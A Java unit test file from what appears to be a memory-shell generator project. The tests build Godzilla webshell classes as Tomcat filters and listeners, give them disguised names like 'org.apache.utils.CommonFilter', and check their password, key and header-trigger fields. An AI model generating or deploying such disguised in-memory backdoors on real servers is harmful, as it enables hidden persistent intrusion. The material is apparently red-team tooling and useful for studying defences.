package com.reajason.javaweb.memsell;

import com.reajason.javaweb.memsell.tomcat.godzilla.GodzillaFilter;
import com.reajason.javaweb.memsell.tomcat.godzilla.GodzillaListener;
import com.reajason.javaweb.util.ClassUtils;
import me.gv7.woodpecker.tools.common.FileUtil;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

import java.io.IOException;

import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
class GodzillaGeneratorTest {

    GodzillaGenerator godzillaGenerator = new GodzillaGenerator();
    String pass = "pass";
    String key = "key";
    String headerName = "User-Agent";
    String headerValue = "test";

    @Test
    @Disabled("just for generate")
    void testGenerate() throws IOException {
        System.out.println("hello");
        String className = "org.apache.utils.CommonFilter";
        byte[] bytes = godzillaGenerator.generate(GodzillaFilter.class, className, pass, key, headerName, headerValue);
        FileUtil.writeFile("Class.class", bytes);
    }

    @Test
    void generateFilter() {
        String className = "org.apache.utils.CommonFilter";
        byte[] bytes = godzillaGenerator.generate(GodzillaFilter.class, className, pass, key, headerName, headerValue);
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(className, obj.getClass().getName());
        assertEquals(pass, ClassUtils.getFieldValue(obj, "pass"));
        assertEquals("3c6e0b8a9c15224a", ClassUtils.getFieldValue(obj, "key"));
        assertEquals(headerName, ClassUtils.getFieldValue(obj, "headerName"));
        assertEquals(headerValue, ClassUtils.getFieldValue(obj, "headerValue"));
    }

    @Test
    void generateListener() {
        String className = "org.apache.utils.CommonListener";
        byte[] bytes = godzillaGenerator.generate(GodzillaListener.class, className, pass, key, headerName, headerValue);
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(className, obj.getClass().getName());
        assertEquals(pass, ClassUtils.getFieldValue(obj, "pass"));
        assertEquals("3c6e0b8a9c15224a", ClassUtils.getFieldValue(obj, "key"));
        assertEquals(headerName, ClassUtils.getFieldValue(obj, "headerName"));
        assertEquals(headerValue, ClassUtils.getFieldValue(obj, "headerValue"));
    }
}